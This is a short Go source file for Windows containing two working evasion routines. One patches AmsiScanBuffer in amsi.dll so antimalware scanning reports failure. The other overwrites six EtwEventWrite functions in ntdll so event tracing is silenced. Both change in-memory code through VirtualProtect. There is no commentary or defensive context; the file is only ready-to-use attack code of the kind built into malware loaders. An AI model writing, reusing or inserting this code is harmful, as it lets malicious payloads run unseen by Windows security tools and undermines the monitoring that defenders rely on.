//go:build windows

package main

import (
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func amsiBypass() {
	k32 := windows.NewLazySystemDLL("kernel32.dll")
	loadLib := k32.NewProc("LoadLibraryW")
	getProc := k32.NewProc("GetProcAddress")
	vp := k32.NewProc("VirtualProtect")
	amsiName, _ := syscall.UTF16PtrFromString("amsi.dll")
	mod, _, _ := loadLib.Call(uintptr(unsafe.Pointer(amsiName)))
	if mod == 0 {
		return
	}
	fn := []byte("AmsiScanBuffer\x00")
	addr, _, _ := getProc.Call(mod, uintptr(unsafe.Pointer(&fn[0])))
	if addr == 0 {
		return
	}
	var old uint32
	patch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}
	vp.Call(addr, uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&old)))
	copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:len(patch):len(patch)], patch)
	vp.Call(addr, uintptr(len(patch)), uintptr(old), uintptr(unsafe.Pointer(&old)))
}

func etwBypass() {
	k32 := windows.NewLazySystemDLL("kernel32.dll")
	getProc := k32.NewProc("GetProcAddress")
	vp := k32.NewProc("VirtualProtect")
	ntdll := windows.NewLazySystemDLL("ntdll.dll").Handle()
	funcs := []string{
		"EtwEventWrite", "EtwEventWriteEx", "EtwEventWriteFull",
		"EtwEventWriteString", "EtwEventWriteTransfer",
		"EtwEventWriteNoRegistration",
	}
	for _, name := range funcs {
		fb := append([]byte(name), 0)
		addr, _, _ := getProc.Call(ntdll, uintptr(unsafe.Pointer(&fb[0])))
		if addr == 0 {
			continue
		}
		var old uint32
		patch := []byte{0x48, 0x33, 0xC0, 0xC3}
		vp.Call(addr, uintptr(len(patch)), windows.PAGE_EXECUTE_READWRITE, uintptr(unsafe.Pointer(&old)))
		copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:len(patch):len(patch)], patch)
		vp.Call(addr, uintptr(len(patch)), uintptr(old), uintptr(unsafe.Pointer(&old)))
	}
}
